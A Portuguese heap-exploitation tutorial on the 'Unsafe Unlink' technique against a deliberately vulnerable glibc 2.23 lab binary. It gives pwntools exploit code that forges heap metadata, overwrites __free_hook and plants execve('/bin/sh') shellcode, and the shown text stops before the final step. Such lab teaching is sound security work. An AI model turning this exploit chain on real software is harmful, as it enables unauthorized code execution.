<p>Antes de entendermos a abordagem da técnica de exploração do processo de <em>unlinking</em> em versões modernas da GLIBC, o que envolve um pouco mais de complexidade, vamos voltar para as versões anteriores ao ano de 2000, antes da implementação do <code class="language-plaintext highlighter-rouge">NX</code> (<em>No Execute</em>), quando o <em>unsafe unlik</em> foi criado originalmente.</p>

<h2 id="unsafe-unlink">Unsafe Unlink</h2>

<p>A técnica <code class="language-plaintext highlighter-rouge">Unsafe Unlink</code> é considerata a técnica original de exploração de <em>heap</em> na GLIBC. Desenvolvida no ano 2000 por <code class="language-plaintext highlighter-rouge">Alexander Peslyak, a.k.a. Solar Designer</code>, foi originalmente utilizada para explorar o navegador <code class="language-plaintext highlighter-rouge">Netscape</code> através de <em>heap overflow</em>. Posteriormente, esta técnica também foi utilizada para explorar o binário <code class="language-plaintext highlighter-rouge">sudo</code> no ano seguinte (a descrição da exploração se encontra no artigo “<em>Vudo Malloc Tricks</em>”).</p>

<blockquote>
  <p><code class="language-plaintext highlighter-rouge">Alexander Peslyak</code> não só foi o criador da primeira técnica de exploração de <em>heap</em>, como também criador da técnica de exploração de binários <code class="language-plaintext highlighter-rouge">ret2libc</code> em 1997 após a publicação “<em>Smashing the Stack for Fun and Profit</em>” de <code class="language-plaintext highlighter-rouge">AlephOne</code>.<br />
Alexander Peslyak também é um dos pais da técnica <code class="language-plaintext highlighter-rouge">Return-oriented progamming</code>, conhecida como <code class="language-plaintext highlighter-rouge">ROP</code>, e também criador da ferramenta de quebra de <em>hashes</em> <code class="language-plaintext highlighter-rouge">John the Ripper</code>.</p>
</blockquote>

<p>No diretódio <code class="language-plaintext highlighter-rouge">unsafe_unlink</code> do material de apoio, existe um binário com o mesmo nome. Podemos checar seus recursos de segurança que estão habilitados no binário com a ferramenta <code class="language-plaintext highlighter-rouge">checksec</code>.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_182.png" alt="Checando os recursos de segurança" /></p>

<p>Diferente dos binários anteriores, podemos ver que o <code class="language-plaintext highlighter-rouge">NX</code> está desativado desta vez, pois estamos simulando um binário da década de 90 onde o <code class="language-plaintext highlighter-rouge">NX</code> ainda não havia sido implementado. Também podemos observar que este binário foi compilado com uma versão específica da GLIBC, <code class="language-plaintext highlighter-rouge">2.23</code> que também correesponde a uma versão da época.<br />
Podemos então carregar este binário no GDB e executá-lo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_183.png" alt="Executando o programa" /></p>

<p>Temos uma tela similar aos demais binários, onde encontramos o vazamento de um endereço da GLIBC, e um vazamento da <em>heap</em>, seguidos do menu de costume.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_184.png" alt="Opção 1" /></p>

<p>A opção um, nos permite alocar dois <em>chunks</em>, porém limitados aos chamados <em>small chunks</em>. O <em>chunk</em> considerado <em>small</em> precisa ter menos que <code class="language-plaintext highlighter-rouge">0x400</code> bytes de tamanho e também incluem os <em>chunks</em> de tamanho entre <code class="language-plaintext highlighter-rouge">0x20</code> e <code class="language-plaintext highlighter-rouge">0x80</code> dos <em>fastbins</em>. Neste caso, podemos alocar <em>small chunks</em> excluindo os tamanhos <em>fast</em>.</p>

<p>Ao solicitarmos um <em>chunk</em> com o menor tamanho permitido pelo binário, diferente dos demais, o programa não nos pede o <em>data</em> para preencher este <em>chunk</em>, pois a escrita dos dados acontece em uma opção diferente no menu.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_185.png" alt="Requisitando um chunk" /></p>

<p>A opção dois, nos permite escrever dados em nosso <em>chunk</em> o referenciando pelo índice, vamos preencher o <em>chunk</em> 0 com algum lixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_186.png" alt="Preenchendo o chunk" /></p>

<p>Agora podemos pausar o GDB e inspecionar a <em>heap</em>. Como podemos ver na imagem abaixo, alocamos um <em>chunk</em> com o tamanho de <code class="language-plaintext highlighter-rouge">0x90</code> bytes, cujo valor no <em>user data</em> foi preenchido com nosso lixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_187.png" alt="Heap" /></p>

<p>A opção três nos permite liberar um <em>chunk</em> de acordo com seu índice, porém, antes de liberá-lo, vamos solicitar mais um <em>chunk</em> de <code class="language-plaintext highlighter-rouge">0x90</code> bytes, para evitar que o primeiro <em>chunk</em> seja consolidado com o <em>top chunk</em>.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_188.png" alt="Solicitando um chunk e liberando o anterior" /></p>

<p>Ao checar a <em>heap</em>, podemos ver as mesmas mudanças ocorridas no binário explorado anteriormente. A <em>flag</em> <code class="language-plaintext highlighter-rouge">prev_inuse</code> (indicada em vermelho) foi retirada do segundo <em>chunk</em>, indicando que o chunk anterior não está mais em uso. O ultimo quadword do <em>user data</em> do nosso primeiro <em>chunk</em> agora pertence ao segundo <em>chunk</em> e foi reaproveitado como <code class="language-plaintext highlighter-rouge">prev_size field</code> contendo o tamanho do <em>chunk</em> (indicado em verde). Por último, o <em>chunk</em> que foi liberado foi ligado ao <em>unsortedbin</em>, e seus dois primeiros <em>quadwords</em> foram reaproveitados como “fd” e “bk” (indicado em azul).</p>

<p><img src="/img/papers/heap_p1/paper_heap1_189.png" alt="Análise da heap" /></p>

<p>Portanto, podemos solicitar até dois <em>chunks</em>, escrever dados neles quando quisermos e liberá-los quando quisermos.</p>

<p>Podemos verificar se este binário possui vulnerabilidade de <em>overflow</em> requisitando um <em>chunk</em> e escrevendo mais dados do que suporta.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_190.png" alt="Verificando overflow" /></p>

<p>Quando pausamos o programa no GDB e verificamos a <em>heap</em>, podemos verificar que não só preenchemos o <em>data field</em>, como sobrescrevemos o <em>top chunk size field</em>, mostrando que o binário é vulnerável a <em>overflow</em>, conforme imagem abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_191.png" alt="Vulnerável a overflow" /></p>

<p>Este binário possui uma vulnerabilidade similar o binário explorado na técnica <code class="language-plaintext highlighter-rouge">The house of Force</code>, no entanto, como não estamos trabalhando com os <em>fastbins</em>, podemos sobrescrever não só o <em>top chunk size field</em> como também os <em>size fields</em> pertencentes a outros <em>chunks</em>. Portanto, vamos solicitar mais um <em>chunk</em> de <code class="language-plaintext highlighter-rouge">0x90</code> bytes e inspecionar a <em>heap</em>.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_192.png" alt="Heap" /></p>

<p>Como podemos observar, agora temos dois <em>chunks</em> de <code class="language-plaintext highlighter-rouge">0x90</code> bytes seguidos de um <em>top chunk size field</em> corrompido. Podemos editar o primeiro <em>chunk</em> novamente e enviar ainda mais dados para sobrescrever o <em>size field</em> do segundo <em>chunk</em>.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_193.png" alt="Overflow" /></p>

<p>Pausando no GDB, podemos visualizar a <em>heap</em>, porém o comando <code class="language-plaintext highlighter-rouge">vis</code> não irá reconhecer o <em>top chunk size field</em> corrompido e não vai nos mostrar o que precisamos, para isso podemos utilizar o comando <code class="language-plaintext highlighter-rouge">dq</code>.<br />
A estrutura <code class="language-plaintext highlighter-rouge">mp_</code> é utilizada pela malloc, para armazenar uma pequena quantidade de parâmetros de metadados, e podemos utilizá-lo para inspecionar o parâmetro <code class="language-plaintext highlighter-rouge">sbrk_base</code> que contém o endereço inicial da <em>heap</em> e imprimir os próximos 38 <em>quadwords</em> de memória. Veremos mais sobre o <code class="language-plaintext highlighter-rouge">mp_</code> mais adiante.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_194.png" alt="Heap" /></p>

<p>Conforme podemos observar, o lixo enviado para o primeiro <em>chunk</em> sobrescreveu o <em>size field</em> do segundo <em>chunk</em>. Também podemos ver o <em>top chunk size field</em> corrompido no final do <em>user data</em> do segundo <em>chunk</em>.</p>

<blockquote>
  <p>Mesmo que neste caso conseguimos alterar o <em>top chunk size field</em> como fizemos na técnica <code class="language-plaintext highlighter-rouge">The house of Force</code>, não conseguimos utilizar esta técnica, pois somos limitados a solicitar apenas dois <em>chunks</em>.<br />
Porém, podemos imaginar como corromper o <em>size field</em> de um <em>chunk</em> normal pode nos beneficiar:<br />
Poderiamos alterar seu tamanho e liberá-lo, então teríamos que requisitá-lo novamente, porém não é possível graças a limitação de dois <em>chunks</em> imposta pelo binário. No entando, ao invés de trabalhar com o tamanho do <em>chunk</em>, poderíamos trabalhar com as <em>flags</em>.</p>
</blockquote>

<p>Sabendo que a <em>flag</em> <code class="language-plaintext highlighter-rouge">prev_inuse</code> é utilizada pela malloc para determinar se o <em>chunk</em> anterior é um candidato a consolidação, se conseguirmos remover a <em>flag</em> <code class="language-plaintext highlighter-rouge">prev_inuse</code> do segundo <em>chunk</em>, poderiamos indicar para malloc que quando liberarmos este segundo <em>chunk</em>, o primeiro seria um candidato a consolidação.</p>

<p>Também sabemos que o processo de consolidação envolve o processo de <em>unlinking</em> do primeiro <em>chunk</em>, mas este primeiro <em>chunk</em> não estará realmente livre, ou seja, não estaria ligado a nenhuma lista de <em>chunks</em> livres, portanto, não possui nenhum “fd” ou “bk”.</p>

<p>Esta seria uma oportunidade de fornecer um “fd” e um “bk” falsos, causando uma escrita refletida.</p>

<p>Para testarmos esta teoria, vamos criar o script base <code class="language-plaintext highlighter-rouge">code_execution.py</code> desta forma:</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python3
</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="c1"># configurando o binario e a GLIBC
</span><span class="n">elf</span> <span class="o">=</span> <span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"unsafe_unlink"</span><span class="p">)</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">runpath</span> <span class="o">+</span> <span class="sa">b</span><span class="s">"/libc.so.6"</span><span class="p">)</span> 

<span class="c1"># GDB config
</span><span class="n">gs</span> <span class="o">=</span> <span class="s">'''
continue
'''</span>

<span class="c1"># funcao para iniciar
</span><span class="k">def</span> <span class="nf">start</span><span class="p">():</span>
    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">GDB</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">gdb</span><span class="p">.</span><span class="n">debug</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">path</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gs</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">process</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">path</span><span class="p">)</span>

<span class="c1"># indice do chunk alocado
</span><span class="n">index</span> <span class="o">=</span> <span class="mi">0</span>

<span class="c1"># seleciona a funcao "malloc", envia o tamanho e os dados e retorna o indice do chunk
</span><span class="k">def</span> <span class="nf">malloc</span><span class="p">(</span><span class="n">size</span><span class="p">):</span>
    <span class="k">global</span> <span class="n">index</span>
    <span class="n">io</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">"1"</span><span class="p">)</span>
    <span class="n">io</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"size: "</span><span class="p">,</span> <span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">size</span><span class="si">}</span><span class="s">"</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
    <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">)</span>
    <span class="n">index</span> <span class="o">+=</span> <span class="mi">1</span>
    <span class="k">return</span> <span class="n">index</span> <span class="o">-</span> <span class="mi">1</span>

<span class="c1"># seleciona a funcao "edit" e envia os dados para o chunk.
</span><span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">index</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
    <span class="n">io</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">"2"</span><span class="p">)</span>
    <span class="n">io</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"index: "</span><span class="p">,</span> <span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">index</span><span class="si">}</span><span class="s">"</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
    <span class="n">io</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"data: "</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
    <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">)</span>

<span class="c1"># seleciona a opcao "free" e envia o indice.
</span><span class="k">def</span> <span class="nf">free</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
    <span class="n">io</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">"3"</span><span class="p">)</span>
    <span class="n">io</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"index: "</span><span class="p">,</span> <span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">index</span><span class="si">}</span><span class="s">"</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
    <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">)</span>

<span class="n">io</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>

<span class="c1"># capturando o endereco da puts() que o binario vaza
</span><span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"puts() @ "</span><span class="p">)</span>
<span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recvline</span><span class="p">(),</span> <span class="mi">16</span><span class="p">)</span> <span class="o">-</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">puts</span>

<span class="c1"># capturando o endereco da heap que o binario vaza
</span><span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"heap @ "</span><span class="p">)</span>
<span class="n">heap</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recvline</span><span class="p">(),</span> <span class="mi">16</span><span class="p">)</span>
<span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">)</span>
<span class="n">io</span><span class="p">.</span><span class="n">timeout</span> <span class="o">=</span> <span class="mf">0.1</span>

<span class="c1">#===============EXPLOITING================#
</span>
<span class="c1"># prepara o shellcode execve("/bin/sh") com um "jmp over" onde o fd sera escrito.
</span><span class="n">shellcode</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="s">"jmp shellcode;"</span> <span class="o">+</span> <span class="s">"shellcode:"</span> <span class="o">+</span> <span class="n">shellcraft</span><span class="p">.</span><span class="n">execve</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">))</span>


<span class="c1"># =======================================#
</span>
<span class="n">io</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div></div>
<p>Assim como nos scripts anteriores, este contém funções auxiliares que nos permitem enviar instruções através das oções do menu do binário para criar, editar e liberar <em>chunks</em>. Além destas, temos uma variável que gera um <em>shellcode</em> compilado com o módulo <code class="language-plaintext highlighter-rouge">shellcraft</code> do pwntools, esta variável gera um <em>data section</em> com a função <code class="language-plaintext highlighter-rouge">shellcode</code> em <code class="language-plaintext highlighter-rouge">Assembly</code>.</p>

<p>Vamos começar, reproduzindo no script, a mesma coisa que fizemos manualmente, vamos requisitar dois <em>chunks</em>, “A”e “B” de <code class="language-plaintext highlighter-rouge">0x90</code> bytes de tamanho, ficando desta forma:</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#===============EXPLOITING================#
</span>
<span class="c1"># prepara o shellcode execve("/bin/sh") com um "jmp over" onde o fd sera escrito.
</span><span class="n">shellcode</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="s">"jmp shellcode;"</span> <span class="o">+</span> <span class="s">"shellcode:"</span> <span class="o">+</span> <span class="n">shellcraft</span><span class="p">.</span><span class="n">execve</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">))</span>

<span class="c1"># requisitando 2 chunks
</span><span class="n">chunk_A</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x88</span><span class="p">)</span>
<span class="n">chunk_B</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x88</span><span class="p">)</span>

<span class="c1"># =======================================#
</span></code></pre></div></div>
<p>Executando o script com as opções do GDB, podemos checar a heap.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_195.png" alt="Heap" /></p>

<p>Conforme esperado, temos dois <em>chunks</em> criados, ambos com a <em>flag</em> <code class="language-plaintext highlighter-rouge">prev_inuse</code> configurada. Agora podemos voltar ao editor do script, e inserir um <em>overflow</em> no <em>size field</em> do <em>chunk</em> B.</p>

<p>Neste caso, queremos manter o tamanho do <em>chunk</em>, porém alterar a <em>flag</em> <code class="language-plaintext highlighter-rouge">prev_inuse</code>. Para isso, podemos chamar a função auxiliar <code class="language-plaintext highlighter-rouge">edit()</code> do nosso script e enviar <code class="language-plaintext highlighter-rouge">0x88</code> bytes de lixo, pois este é o tamanho do <em>chunk</em> que criamos. Depois, precisamos enviar o valor que vai sobrescrever o <em>size field</em> do segundo <em>chunk</em> que atualmente tem o valor de <code class="language-plaintext highlighter-rouge">0x91</code>, com o valor <code class="language-plaintext highlighter-rouge">0x90</code>, que irá manter o tamanho do <em>chunk</em>, porém remover a <em>flag</em> <code class="language-plaintext highlighter-rouge">prev_inuse</code>. O bloco de exploração ficou da seguinte forma:</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#===============EXPLOITING================#
</span>
<span class="c1"># prepara o shellcode execve("/bin/sh") com um "jmp over" onde o fd sera escrito.
</span><span class="n">shellcode</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="s">"jmp shellcode;"</span> <span class="o">+</span> <span class="s">"shellcode:"</span> <span class="o">+</span> <span class="n">shellcraft</span><span class="p">.</span><span class="n">execve</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">))</span>

<span class="c1"># requisitando 2 chunks
</span><span class="n">chunk_A</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x88</span><span class="p">)</span>
<span class="n">chunk_B</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x88</span><span class="p">)</span>

<span class="c1"># sobrescrevendo o size field do segundo chunk
</span><span class="n">edit</span><span class="p">(</span><span class="n">chunk_A</span><span class="p">,</span> <span class="sa">b</span><span class="s">"A"</span><span class="o">*</span><span class="mh">0x88</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x90</span><span class="p">))</span>

<span class="c1"># =======================================#
</span></code></pre></div></div>

<p>Executando o script com as opções do GDB e inspecionando a heap, vemos que obtivemos sucesso conforme imagem abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_196.png" alt="Heap" /></p>

<p>O <em>chunk</em> B agora tem um <em>size field</em> com o valor de <code class="language-plaintext highlighter-rouge">0x90</code> e o ultimo quadword do <em>user data</em> do <em>chunk</em> A foi reaproveitado como <code class="language-plaintext highlighter-rouge">prev_size</code> do <em>chunk</em> B.</p>

<p>Portanto, se tentarmos liberar o <em>chunk</em> B agora, a malloc irá checar sua <em>flag</em> <code class="language-plaintext highlighter-rouge">prev_inuse</code> e ver que está vazia e tentar consolidar o <em>chunk</em> B com o <em>chunk</em> A. Porém, para tentar encontrar o início do <em>chunk</em> A, a malloc precisa utilizar o <code class="language-plaintext highlighter-rouge">prev_size field</code> do <em>chunk</em> B, e neste momento, este campo está preenchido com lixo, então a malloc receberia o sinal <code class="language-plaintext highlighter-rouge">sigfault</code> ao tentar acessar este endereço menos <code class="language-plaintext highlighter-rouge">0x4141414141414141</code> bytes.</p>

<p>Portanto, vamos voltar ao script, e fazer mais algumas alterações.<br />
Vamos preparar algumas variáveis para facilitar a criação do script. Como teremos que forjar um par de “fd” e “bk” para nossa escrita refletida, vamos prepará-las com valores inválidos. também vamos criar um valor falso para campo <code class="language-plaintext highlighter-rouge">prev_size</code>, para guiar a malloc para o início real do <em>chunk</em> A, neste caso, este valor é <code class="language-plaintext highlighter-rouge">0x90</code>. Para facilitar o script, também vamos criar uma variável com o valor falso da <em>flag</em> <code class="language-plaintext highlighter-rouge">size_field</code> que também tem o valor de <code class="language-plaintext highlighter-rouge">0x90</code>.</p>

<p>Como já conhecemos a estrutura de um <em>chunk</em> normal e vamos forjar um <em>chunk</em> livre falso, sabemos que os dois primeiros <em>quadwords</em> do <em>user data</em> precisam conter os “fd” e o “bk” no <em>chunk</em> A seguido de lixo suficiente para preencher o <em>user data</em> até chegar ao campo <code class="language-plaintext highlighter-rouge">prev_size</code>. Podemos utilizar a função <code class="language-plaintext highlighter-rouge">p8()</code> do pwntools para imprimir caracteres nulos deixando o visual da heap mais compreensível. Então enviamos os <code class="language-plaintext highlighter-rouge">prev_size</code> e <code class="language-plaintext highlighter-rouge">size field</code> falsos. O bloco de exploração fica desta forma:</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#===============EXPLOITING================#
</span>
<span class="c1"># prepara o shellcode execve("/bin/sh") com um "jmp over" onde o fd sera escrito.
</span><span class="n">shellcode</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="s">"jmp shellcode;"</span> <span class="o">+</span>  <span class="s">"shellcode:"</span> <span class="o">+</span> <span class="n">shellcraft</span><span class="p">.</span><span class="n">execve</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">))</span>

<span class="c1"># requisitando 2 chunks
</span><span class="n">chunk_A</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x88</span><span class="p">)</span>
<span class="n">chunk_B</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x88</span><span class="p">)</span>

<span class="c1"># criando variaveis
</span><span class="n">fd</span> <span class="o">=</span> <span class="mh">0xdeadbeef</span>
<span class="n">bk</span> <span class="o">=</span> <span class="mh">0xdeadbeef</span>
<span class="n">prev_size</span> <span class="o">=</span> <span class="mh">0x90</span>
<span class="n">fake_size</span> <span class="o">=</span> <span class="mh">0x90</span>

<span class="c1"># sobrescrevendo o size field do segundo chunk
</span><span class="n">edit</span><span class="p">(</span><span class="n">chunk_A</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">fd</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">bk</span><span class="p">)</span> <span class="o">+</span> <span class="n">p8</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mh">0x70</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">prev_size</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">fake_size</span><span class="p">))</span>

<span class="c1"># =======================================#
</span></code></pre></div></div>

<p>Com as alterações realizadas, podemos executar o script com as opções do GDB e inspecionar a heap.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_197.png" alt="Heap" /></p>

<p>Conforme podemos observar, nosso par de “fd” e “bk” forjados estão no início do <em>chunk</em> A, marcados em vermelho, a <em>flag</em> <code class="language-plaintext highlighter-rouge">prev_inuse</code> do <em>chunk</em> B foi removida, marcado em azul, e conseguimos um campo <code class="language-plaintext highlighter-rouge">prev_size</code> válido para a malloc utilizar, marcado em verde.</p>

<p>Agora se liberarmos o <em>chunk</em> B, a malloc vai checar sua <em>flag</em> <code class="language-plaintext highlighter-rouge">prev_inuse</code>, verificar que não existe, tentar consilidar o <em>chunk</em> B com o <em>chunk</em> A, ler o campo <code class="language-plaintext highlighter-rouge">prev_size</code> forjado e subtraí-lo do endereço do <em>chunk</em> B para encontrar o início do <em>chunk</em> A com sucesso. Depois tentará desvincular o <em>chunk</em> B de qualquer lista em que esteja ligado</p>

<p>É neste ponto que a malloc vai performar o processo de <em>unlinking</em> lendo nosso par de “fd” e “bk” forjadas, nos dando a escrita refletida. A malloc vai seguir nosso “fd” acreditando ser outro <em>chunk</em> e sobrescrever o “bk” deste <em>chunk</em> com nosso “bk”. Depois a malloc vai seguir nosso “bk” que também acredita ser outro <em>chunk</em> e sobrescrever seu “fd” com nosso “fd”.</p>

<p>Para que isto funcione, ambos os endereços que fornecemos precisam apontar para um local na memória que permita escrita, isso significa que se tentarmos sobrescrever o <code class="language-plaintext highlighter-rouge">free hook</code> com o endereço da <code class="language-plaintext highlighter-rouge">system()</code>, por exemplo, a segunda metade da nossa escrita refletida vai tentar escrever o endereço do <code class="language-plaintext highlighter-rouge">free hook</code> na função  <code class="language-plaintext highlighter-rouge">system()</code>, causando <code class="language-plaintext highlighter-rouge">sigfault</code> por tentar escrever em um ponto da memória que não permite escrita.</p>

<p>Porém, como estamos lidando com um programa que simula a condição da década de 90, onde o <code class="language-plaintext highlighter-rouge">NX</code> ainda não foi implementado, tudo que escrevermos em memória será executado.</p>

<p>Como verificamos que o binário foi compilado com <code class="language-plaintext highlighter-rouge">Full RELRO</code>, precisaremos utilizar o <code class="language-plaintext highlighter-rouge">malloc hook</code> para nosso ataque. Temos um vazamento de endereço da <em>heap</em>, portanto podemos escrever nosso <code class="language-plaintext highlighter-rouge">shellcode</code> na própria <em>heap</em>.</p>

<p>Para testermos esta teoria, vamos editar nosso script novamente. Como já temos uma variável que cria um <code class="language-plaintext highlighter-rouge">shellcode</code>, a primeira coisa que precisamos fazer é escrever este <code class="language-plaintext highlighter-rouge">shellcode</code> no <em>chunk</em> A, porém não podemos esquecer de subtrair o lixo enviado com o tamanho do <code class="language-plaintext highlighter-rouge">shellcode</code>.</p>

<p>Depois, precisamos focar na primeira parte da nossa escrita refletida, onde temos que apontar nosso “bk” para o endereço do nosso <code class="language-plaintext highlighter-rouge">shellcode</code> que se encontra <code class="language-plaintext highlighter-rouge">0x20</code> bytes após o endereço da heap, conforme ilustrado abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_198.png" alt="Diferença entre endereços" /></p>

<p>Precisamos copiar este “bk” para o <code class="language-plaintext highlighter-rouge">free hook</code>, desta forma, quando tentarmos liberar outro <em>chunk</em> depois que o processo de <em>unlinking</em> tenha sido concluída, nosso <code class="language-plaintext highlighter-rouge">shellcode</code> será executado. Para que isso ocorra, precisamos apontar nosso “fd” para o <code class="language-plaintext highlighter-rouge">free hook</code>, menos <code class="language-plaintext highlighter-rouge">0x18</code> bytes.</p>

<blockquote>
  <p>Precisamos deste intervalo, pois a malloc vai considerar qualquer coisa para qual nosso “fd” aponte como um <em>chunk</em> e vai sobrescrever sua “bk” que está a 24 ou <code class="language-plaintext highlighter-rouge">0x18</code> bytes após o início deste <em>chunk</em>.</p>
</blockquote>

<p>O bloco de exploração do script fica desta forma:</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#===============EXPLOITING================#
</span>
<span class="c1"># prepara o shellcode execve("/bin/sh") com um "jmp over" onde o fd sera escrito.
</span><span class="n">shellcode</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="s">"jmp shellcode;"</span> <span class="o">+</span> <span class="s">"shellcode:"</span> <span class="o">+</span> <span class="n">shellcraft</span><span class="p">.</span><span class="n">execve</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">))</span>

<span class="c1"># requisitando 2 chunks
</span><span class="n">chunk_A</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x88</span><span class="p">)</span>
<span class="n">chunk_B</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x88</span><span class="p">)</span>

<span class="c1"># criando variaveis
</span><span class="n">fd</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">__free_hook</span> <span class="o">-</span> <span class="mh">0x18</span>
<span class="n">bk</span> <span class="o">=</span> <span class="n">heap</span> <span class="o">+</span> <span class="mh">0x20</span>
<span class="n">prev_size</span> <span class="o">=</span> <span class="mh">0x90</span>
<span class="n">fake_size</span> <span class="o">=</span> <span class="mh">0x90</span>

<span class="c1"># sobrescrevendo o size field do segundo chunk
</span><span class="n">edit</span><span class="p">(</span><span class="n">chunk_A</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">fd</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">bk</span><span class="p">)</span> <span class="o">+</span> <span class="n">shellcode</span> <span class="o">+</span> <span class="n">p8</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="mh">0x70</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">))</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">prev_size</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">fake_size</span><span class="p">))</span>

<span class="c1"># =======================================#
</span></code></pre></div></div>
<p>Com as alterações no script, podemos executá-lo com as opções do GDB e inspecionar a heap onde podemos ver nossos “fd” e “bk” forjados no início do <em>chunk</em> A.</p>
